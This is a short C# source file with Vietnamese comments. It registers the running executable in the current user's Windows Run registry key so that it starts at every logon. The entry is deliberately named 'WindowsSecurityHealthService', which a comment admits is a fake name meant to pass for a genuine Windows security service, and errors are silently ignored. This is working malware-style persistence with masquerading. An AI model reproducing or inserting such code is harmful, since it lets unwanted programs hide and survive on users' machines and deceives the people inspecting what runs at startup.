using Microsoft.Win32;
using System.Diagnostics;

public static class StartupManager
{
    // Tên ứng dụng hiển thị trong Task Manager -> Startup
    const string APP_NAME = "WindowsSecurityHealthService"; // Đặt tên "giả" cho nguy hiểm :))

    public static void AddToStartup()
    {
        try
        {
            // Lấy đường dẫn file .exe hiện tại
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            
            // Mở khóa Registry Run của User hiện tại
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                // Kiểm tra xem đã có chưa, chưa có thì ghi vào
                if (key.GetValue(APP_NAME) == null)
                {
                    key.SetValue(APP_NAME, exePath);
                }
            }
        }
        catch { /* Bỏ qua lỗi nếu không có quyền admin (thường HKCU không cần admin) */ }
    }
}